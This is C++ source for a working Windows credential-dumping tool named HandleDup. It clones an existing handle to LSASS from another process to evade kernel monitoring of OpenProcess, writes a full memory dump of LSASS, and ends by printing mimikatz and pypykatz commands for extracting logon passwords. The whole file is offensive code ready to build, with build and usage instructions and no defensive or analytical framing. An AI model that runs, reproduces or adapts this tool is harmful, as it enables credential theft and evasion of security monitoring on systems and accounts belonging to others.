/*
 * HandleDup.cpp — LSASS Handle Duplication Credential Dump
 *
 * Technique:
 *   Instead of calling OpenProcess() on lsass.exe (which is monitored by
 *   kernel callbacks), this tool finds an existing handle to LSASS held by
 *   another process and duplicates it into our own process space.
 *
 *   1. NtQuerySystemInformation(SystemHandleInformation) to enumerate all handles
 *   2. Find a process that already holds a handle to LSASS
 *   3. NtDuplicateObject to clone that handle into our process
 *   4. MiniDumpWriteDump using the cloned handle
 *
 *   The key insight: we never call OpenProcess() on LSASS directly, so kernel
 *   ObRegisterCallbacks that monitor handle creation to LSASS are bypassed.
 *
 * Build (MinGW x64):
 *   x86_64-w64-mingw32-g++ -o HandleDup.exe HandleDup.cpp -ldbghelp -lntdll -static
 *
 * Build (MSVC):
 *   cl /EHsc HandleDup.cpp /link dbghelp.lib ntdll.lib
 *
 * Usage (run as Administrator):
 *   HandleDup.exe --recon                              List processes with LSASS handles
 *   HandleDup.exe --pid <source_pid> --out dump.dmp     Clone handle from specific PID and dump
 *   HandleDup.exe --auto --out dump.dmp                 Auto-find suitable handle and dump
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <dbghelp.h>
#include <tlhelp32.h>

// ============================================================================
// NT API Definitions
// ============================================================================

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS 0x00000000
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#define SystemHandleInformation 16
#define ObjectTypeInformation   2

typedef LONG NTSTATUS;

typedef struct _SYSTEM_HANDLE_ENTRY {
    ULONG  ProcessId;
    BYTE   ObjectTypeNumber;
    BYTE   Flags;
    USHORT Handle;
    PVOID  Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_ENTRY, *PSYSTEM_HANDLE_ENTRY;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG HandleCount;
    SYSTEM_HANDLE_ENTRY Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_TYPE_INFORMATION {
    UNICODE_STRING TypeName;
    // ... more fields we don't need
    BYTE Reserved[256];
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

// NT API function pointers
typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS(NTAPI* pNtDuplicateObject)(
    HANDLE SourceProcessHandle,
    HANDLE SourceHandle,
    HANDLE TargetProcessHandle,
    PHANDLE TargetHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Options
);

typedef NTSTATUS(NTAPI* pNtQueryObject)(
    HANDLE Handle,
    ULONG ObjectInformationClass,
    PVOID ObjectInformation,
    ULONG ObjectInformationLength,
    PULONG ReturnLength
);

// ============================================================================
// Globals
// ============================================================================

pNtQuerySystemInformation fnNtQuerySystemInformation = NULL;
pNtDuplicateObject        fnNtDuplicateObject = NULL;
pNtQueryObject            fnNtQueryObject = NULL;

// ============================================================================
// Helper Functions
// ============================================================================

BOOL InitNtApis() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll.dll handle\n");
        return FALSE;
    }

    fnNtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    fnNtDuplicateObject = (pNtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
    fnNtQueryObject = (pNtQueryObject)GetProcAddress(hNtdll, "NtQueryObject");

    if (!fnNtQuerySystemInformation || !fnNtDuplicateObject || !fnNtQueryObject) {
        printf("[-] Failed to resolve NT APIs\n");
        return FALSE;
    }

    printf("[+] NT APIs resolved successfully\n");
    return TRUE;
}

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken failed: %lu\n", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        printf("[-] LookupPrivilegeValue failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        printf("[-] AdjustTokenPrivileges failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[-] SeDebugPrivilege not available. Run as Administrator!\n");
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    printf("[+] SeDebugPrivilege enabled\n");
    return TRUE;
}

DWORD GetLsassPid() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "lsass.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return pid;
}

const char* GetProcessNameByPid(DWORD pid) {
    static char name[MAX_PATH];
    name[0] = '\0';

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return "unknown";

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    if (Process32First(hSnap, &pe)) {
        do {
            if (pe.th32ProcessID == pid) {
                strncpy(name, pe.szExeFile, MAX_PATH - 1);
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return name[0] ? name : "unknown";
}

// ============================================================================
// Core: Get all system handles
// ============================================================================

PSYSTEM_HANDLE_INFORMATION GetSystemHandles() {
    ULONG bufferSize = 0x10000;
    PVOID buffer = NULL;
    NTSTATUS status;

    do {
        buffer = malloc(bufferSize);
        if (!buffer) {
            printf("[-] Memory allocation failed (%lu bytes)\n", bufferSize);
            return NULL;
        }

        status = fnNtQuerySystemInformation(
            SystemHandleInformation,
            buffer,
            bufferSize,
            &bufferSize
        );

        if (status == (NTSTATUS)STATUS_INFO_LENGTH_MISMATCH) {
            free(buffer);
            buffer = NULL;
            bufferSize *= 2;
        }
        else if (!NT_SUCCESS(status)) {
            printf("[-] NtQuerySystemInformation failed: 0x%08lX\n", status);
            free(buffer);
            return NULL;
        }
    } while (status == (NTSTATUS)STATUS_INFO_LENGTH_MISMATCH);

    PSYSTEM_HANDLE_INFORMATION handleInfo = (PSYSTEM_HANDLE_INFORMATION)buffer;
    printf("[+] Enumerated %lu system handles\n", handleInfo->HandleCount);
    return handleInfo;
}

// ============================================================================
// Core: Check if a duplicated handle points to LSASS
// ============================================================================

BOOL IsHandleToLsass(HANDLE dupHandle, DWORD lsassPid) {
    // Get the PID that this process handle refers to
    DWORD targetPid = GetProcessId(dupHandle);
    return (targetPid == lsassPid);
}

BOOL IsProcessHandle(HANDLE dupHandle) {
    OBJECT_TYPE_INFORMATION typeInfo;
    ULONG returnLength = 0;

    NTSTATUS status = fnNtQueryObject(
        dupHandle,
        ObjectTypeInformation,
        &typeInfo,
        sizeof(typeInfo),
        &returnLength
    );

    if (!NT_SUCCESS(status)) return FALSE;

    // Compare the type name to L"Process"
    if (typeInfo.TypeName.Buffer && typeInfo.TypeName.Length >= 14) {
        return (wcsncmp(typeInfo.TypeName.Buffer, L"Process", 7) == 0);
    }

    return FALSE;
}

// ============================================================================
// Core: Find and duplicate LSASS handle
// ============================================================================

typedef struct _FOUND_HANDLE {
    HANDLE  hDuplicated;
    DWORD   sourcePid;
    DWORD   originalHandle;
    ACCESS_MASK grantedAccess;
} FOUND_HANDLE;

BOOL IsDangerousAccess(ACCESS_MASK access) {
    // These access masks can cause NtDuplicateObject to hang
    return (access == 0x0012019f ||
            access == 0x001a019f ||
            access == 0x00120189 ||
            access == 0x00100000 ||
            access == 0x00100001);
}

int FindLsassHandles(
    PSYSTEM_HANDLE_INFORMATION handleInfo,
    DWORD filterPid,           // 0 = search all processes
    DWORD lsassPid,
    FOUND_HANDLE* results,
    int maxResults
) {
    int found = 0;
    DWORD myPid = GetCurrentProcessId();

    printf("[*] Searching handles (LSASS PID: %lu)...\n", lsassPid);

    for (ULONG i = 0; i < handleInfo->HandleCount && found < maxResults; i++) {
        PSYSTEM_HANDLE_ENTRY entry = &handleInfo->Handles[i];

        // Skip our own process and LSASS itself
        if (entry->ProcessId == myPid || entry->ProcessId == lsassPid)
            continue;

        // If filtering by PID, skip non-matching
        if (filterPid && entry->ProcessId != filterPid)
            continue;

        // Skip dangerous access masks that can hang NtDuplicateObject
        if (IsDangerousAccess(entry->GrantedAccess))
            continue;

        // Need at least PROCESS_QUERY_INFORMATION | PROCESS_VM_READ on the handle
        // Also need the source to grant DUP_HANDLE
        HANDLE hSourceProcess = OpenProcess(
            PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
            FALSE,
            entry->ProcessId
        );

        if (!hSourceProcess)
            continue;

        HANDLE hDuplicated = NULL;
        NTSTATUS status = fnNtDuplicateObject(
            hSourceProcess,
            (HANDLE)(ULONG_PTR)entry->Handle,
            GetCurrentProcess(),
            &hDuplicated,
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            0,
            0
        );

        if (!NT_SUCCESS(status) || !hDuplicated) {
            CloseHandle(hSourceProcess);
            continue;
        }

        // Check if it's a Process type handle
        if (!IsProcessHandle(hDuplicated)) {
            CloseHandle(hDuplicated);
            CloseHandle(hSourceProcess);
            continue;
        }

        // Check if it points to LSASS
        if (IsHandleToLsass(hDuplicated, lsassPid)) {
            results[found].hDuplicated = hDuplicated;
            results[found].sourcePid = entry->ProcessId;
            results[found].originalHandle = entry->Handle;
            results[found].grantedAccess = entry->GrantedAccess;
            found++;

            printf("[+] Found LSASS handle! Source: %s (PID %lu), Handle: 0x%X, Access: 0x%lX\n",
                GetProcessNameByPid(entry->ProcessId),
                entry->ProcessId,
                entry->Handle,
                entry->GrantedAccess
            );
        } else {
            CloseHandle(hDuplicated);
        }

        CloseHandle(hSourceProcess);
    }

    return found;
}

// ============================================================================
// Core: Dump LSASS memory using cloned handle
// ============================================================================

BOOL DumpLsass(HANDLE hLsass, const char* outputPath) {
    DWORD lsassPid = GetProcessId(hLsass);

    printf("[*] Dumping LSASS (PID: %lu) to: %s\n", lsassPid, outputPath);

    HANDLE hFile = CreateFileA(
        outputPath,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create output file: %lu\n", GetLastError());
        return FALSE;
    }

    BOOL success = MiniDumpWriteDump(
        hLsass,
        lsassPid,
        hFile,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        NULL
    );

    CloseHandle(hFile);

    if (success) {
        printf("[+] LSASS dump complete: %s\n", outputPath);

        // Print file size
        WIN32_FILE_ATTRIBUTE_DATA fad;
        if (GetFileAttributesExA(outputPath, GetFileExInfoStandard, &fad)) {
            ULONGLONG size = ((ULONGLONG)fad.nFileSizeHigh << 32) | fad.nFileSizeLow;
            printf("[+] Dump size: %llu bytes (%.2f MB)\n", size, (double)size / (1024.0 * 1024.0));
        }
    } else {
        printf("[-] MiniDumpWriteDump failed: %lu\n", GetLastError());
        DeleteFileA(outputPath);
    }

    return success;
}

// ============================================================================
// Main
// ============================================================================

void PrintUsage(const char* argv0) {
    printf("HandleDup — LSASS Handle Duplication\n\n");
    printf("Usage:\n");
    printf("  %s --recon                         List processes with LSASS handles\n", argv0);
    printf("  %s --auto --out <path>             Auto-find handle and dump\n", argv0);
    printf("  %s --pid <pid> --out <path>        Clone from specific PID and dump\n", argv0);
    printf("\nMust be run as Administrator.\n");
}

int main(int argc, char** argv) {

    BOOL doRecon = FALSE;
    BOOL doAuto = FALSE;
    DWORD sourcePid = 0;
    const char* outputPath = NULL;

    // Parse arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--recon") == 0) {
            doRecon = TRUE;
        }
        else if (strcmp(argv[i], "--auto") == 0) {
            doAuto = TRUE;
        }
        else if (strcmp(argv[i], "--pid") == 0 && i + 1 < argc) {
            sourcePid = atoi(argv[++i]);
        }
        else if (strcmp(argv[i], "--out") == 0 && i + 1 < argc) {
            outputPath = argv[++i];
        }
        else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            PrintUsage(argv[0]);
            return 0;
        }
    }

    if (!doRecon && !doAuto && !sourcePid) {
        PrintUsage(argv[0]);
        return 1;
    }

    if ((doAuto || sourcePid) && !outputPath) {
        printf("[-] --out <path> is required for dump mode\n");
        return 1;
    }

    // ---- Initialize ----
    printf("=== HandleDup — LSASS Handle Duplication ===\n\n");

    if (!InitNtApis()) return 1;
    if (!EnableDebugPrivilege()) return 1;

    DWORD lsassPid = GetLsassPid();
    if (!lsassPid) {
        printf("[-] Could not find LSASS process\n");
        return 1;
    }
    printf("[+] LSASS PID: %lu\n", lsassPid);

    // ---- Enumerate handles ----
    PSYSTEM_HANDLE_INFORMATION handleInfo = GetSystemHandles();
    if (!handleInfo) return 1;

    FOUND_HANDLE results[64] = { 0 };
    int found = FindLsassHandles(handleInfo, sourcePid, lsassPid, results, 64);

    if (found == 0) {
        printf("[-] No suitable LSASS handles found\n");
        if (sourcePid) {
            printf("    Try --recon to find which PIDs hold LSASS handles\n");
            printf("    Or use --auto to search all processes\n");
        }
        free(handleInfo);
        return 1;
    }

    printf("[+] Found %d LSASS handle(s)\n\n", found);

    // ---- Recon mode: just list and exit ----
    if (doRecon) {
        printf("=== RECON RESULTS ===\n");
        for (int i = 0; i < found; i++) {
            printf("  [%d] PID: %lu (%s), Handle: 0x%X, Access: 0x%lX\n",
                i + 1,
                results[i].sourcePid,
                GetProcessNameByPid(results[i].sourcePid),
                results[i].originalHandle,
                results[i].grantedAccess
            );
            CloseHandle(results[i].hDuplicated);
        }
        printf("\nUse --pid <PID> --out dump.bin to dump using a specific source PID\n");
        free(handleInfo);
        return 0;
    }

    // ---- Dump mode ----
    printf("[*] Using first suitable handle for dump...\n");
    printf("[*] Source: %s (PID %lu), Cloned Handle Access: 0x%lX\n",
        GetProcessNameByPid(results[0].sourcePid),
        results[0].sourcePid,
        results[0].grantedAccess
    );

    BOOL success = DumpLsass(results[0].hDuplicated, outputPath);

    // Cleanup
    for (int i = 0; i < found; i++) {
        CloseHandle(results[i].hDuplicated);
    }
    free(handleInfo);

    if (success) {
        printf("\n[+] SUCCESS — Dump written to: %s\n", outputPath);
        printf("[*] Analyze with: mimikatz \"sekurlsa::minidump %s\" sekurlsa::logonpasswords exit\n", outputPath);
        printf("[*] Or with: pypykatz lsa minidump %s\n", outputPath);
    } else {
        printf("\n[-] FAILED — Could not dump LSASS\n");
    }

    return success ? 0 : 1;
}
